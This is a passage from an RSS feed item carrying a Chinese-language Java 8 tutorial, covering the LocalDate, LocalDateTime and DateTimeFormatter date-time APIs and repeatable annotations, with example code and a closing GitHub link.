&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;&lt;code&gt;LocalDate&lt;/code&gt;, &lt;code&gt;LocalTime&lt;/code&gt;, 因为是 &lt;code&gt;final&lt;/code&gt; 类型的对象，每一次操作都会返回一个新的时间对象。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;LocalDate today = LocalDate.now();
// 今天加一天
LocalDate tomorrow = today.plus(1, ChronoUnit.DAYS);
// 明天减两天
LocalDate yesterday = tomorrow.minusDays(2);

// 2014 年七月的第四天
LocalDate independenceDay = LocalDate.of(2014, Month.JULY, 4);
DayOfWeek dayOfWeek = independenceDay.getDayOfWeek();
System.out.println(dayOfWeek);    // 星期五&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;也可以直接解析日期字符串，生成 &lt;code&gt;LocalDate&lt;/code&gt; 实例。（和 &lt;code&gt;LocalTime&lt;/code&gt; 操作一样简单）&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;DateTimeFormatter germanFormatter =
    DateTimeFormatter
        .ofLocalizedDate(FormatStyle.MEDIUM)
        .withLocale(Locale.GERMAN);

LocalDate xmas = LocalDate.parse(&quot;24.12.2014&quot;, germanFormatter);
System.out.println(xmas);   // 2014-12-24
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;localdatetime&quot;&gt;LocalDateTime&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;LocalDateTime&lt;/code&gt; 是一个&lt;strong&gt;日期-时间&lt;/strong&gt;对象。你也可以将其看成是 &lt;code&gt;LocalDate&lt;/code&gt; 和 &lt;code&gt;LocalTime&lt;/code&gt; 的结合体。操作上，也大致相同。&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;&lt;code&gt;LocalDateTime&lt;/code&gt; 同样是一个 &lt;code&gt;final&lt;/code&gt; 类型对象。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;LocalDateTime sylvester = LocalDateTime.of(2014, Month.DECEMBER, 31, 23, 59, 59);

DayOfWeek dayOfWeek = sylvester.getDayOfWeek();
System.out.println(dayOfWeek);      // 星期三

Month month = sylvester.getMonth();
System.out.println(month);          // 十二月

// 获取改时间是该天中的第几分钟
long minuteOfDay = sylvester.getLong(ChronoField.MINUTE_OF_DAY);
System.out.println(minuteOfDay);    // 1439&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;如果再加上的时区信息，&lt;code&gt;LocalDateTime&lt;/code&gt; 还能够被转换成 &lt;code&gt;Instance&lt;/code&gt; 实例。&lt;code&gt;Instance&lt;/code&gt; 能够被转换成老版本中 &lt;code&gt;java.util.Date&lt;/code&gt; 对象。&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;Instant instant = sylvester
        .atZone(ZoneId.systemDefault())
        .toInstant();

Date legacyDate = Date.from(instant);
System.out.println(legacyDate);     // Wed Dec 31 23:59:59 CET 2014&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;格式化 &lt;code&gt;LocalDateTime&lt;/code&gt; 对象就和格式化 LocalDate 或者 LocalTime 一样。除了使用预定义的格式以外，也可以自定义格式化输出。&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;DateTimeFormatter formatter =
    DateTimeFormatter
        .ofPattern(&quot;MMM dd, yyyy - HH:mm&quot;);

LocalDateTime parsed = LocalDateTime.parse(&quot;Nov 03, 2014 - 07:13&quot;, formatter);
String string = formatter.format(parsed);
System.out.println(string);     // Nov 03, 2014 - 07:13&lt;/code&gt;
&lt;/pre&gt;
&lt;blockquote readability=&quot;5.7631578947368&quot;&gt;
&lt;p&gt;注意：和 &lt;code&gt;java.text.NumberFormat&lt;/code&gt; 不同，新的 &lt;code&gt;DateTimeFormatter&lt;/code&gt; 类是 &lt;code&gt;final&lt;/code&gt; 类型的，同时也是线程安全的。更多细节请查看&lt;a href=&quot;http://download.java.net/jdk8/docs/api/java/time/format/DateTimeFormatter.html&quot;&gt;这里&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;annotations-注解&quot;&gt;Annotations 注解&lt;/h2&gt;
&lt;p&gt;在 Java 8 中，注解是可以重复的。让我通过下面的示例代码，来看看到底是咋回事。&lt;/p&gt;
&lt;p&gt;首先，我们定义一个包装注解，里面包含了一个有着实际注解的数组：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;@interface Hints {
    Hint[] value();
}

@Repeatable(Hints.class)
@interface Hint {
    String value();
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;Java 8 中，通过 &lt;code&gt;@Repeatable&lt;/code&gt;，允许我们对同一个类使用多重注解：&lt;/p&gt;
&lt;p&gt;第一种形态：使用注解容器（老方法）&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;@Hints({@Hint(&quot;hint1&quot;), @Hint(&quot;hint2&quot;)})
class Person {}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;第二种形态：使用可重复注解（新方法）&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;@Hint(&quot;hint1&quot;)
@Hint(&quot;hint2&quot;)
class Person {}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;使用第二种形态，Java 编译器能够在内部自动对 &lt;code&gt;@Hint&lt;/code&gt; 进行设置。这对于需要通过反射来读取注解信息时，是非常重要的。&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;Hint hint = Person.class.getAnnotation(Hint.class);
System.out.println(hint);                   // null

Hints hints1 = Person.class.getAnnotation(Hints.class);
System.out.println(hints1.value().length);  // 2

Hint[] hints2 = Person.class.getAnnotationsByType(Hint.class);
System.out.println(hints2.length);          // 2&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;尽管我们绝对不会在 &lt;code&gt;Person&lt;/code&gt; 类上声明 &lt;code&gt;@Hints&lt;/code&gt; 注解，但是它的信息仍然是可以通过 &lt;code&gt;getAnnotation(Hints.class)&lt;/code&gt; 来读取的。&lt;br/&gt;并且，&lt;code&gt;getAnnotationsByType&lt;/code&gt; 方法会更方便，因为它赋予了所有 &lt;code&gt;@Hints&lt;/code&gt; 注解标注的方法直接的访问权限。&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;@Target({ElementType.TYPE_PARAMETER, ElementType.TYPE_USE})
@interface MyAnnotation {}&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;结语&quot;&gt;结语&lt;/h2&gt;
&lt;p&gt;Java 8 新特性的编程指南到此就告一段落了。当然，还有很多内容需要进一步研究和说明。这就需要靠读者您来对 JDK 8 进一步探究了，&lt;br/&gt;例如：&lt;code&gt;Arrays.parallelSort&lt;/code&gt;, &lt;code&gt;StampedLock&lt;/code&gt; 和 &lt;code&gt;CompletableFuture&lt;/code&gt; 等等，我这里也仅是起到抛砖引玉的作用而已。&lt;br/&gt;​&lt;br/&gt;最后，我希望这个教程能够对您有所帮助，也希望您阅读愉快。&lt;/p&gt;
&lt;h2 id=&quot;github-地址&quot;&gt;GitHub 地址&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/weiwosuoai/java8_guide&quot; class=&quot;uri&quot;&gt;https://github.com/weiwosuoai/java8_guide&lt;/a&gt;&lt;/p&gt;
</description>
<pubDate>Thu, 07 Mar 2019 06:50:00 +0000</pubDate>
<dc:creator>犬小哈</dc:creator>
<og:description>本教程翻译整理自 'https://github.com/winterbe/java8 tutorial' 本教程首发自个人网站: 'https://www.exception.site/java8/</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/quanxiaoha/p/10489615.html</dc:identifier>
</item>
</channel>
</rss>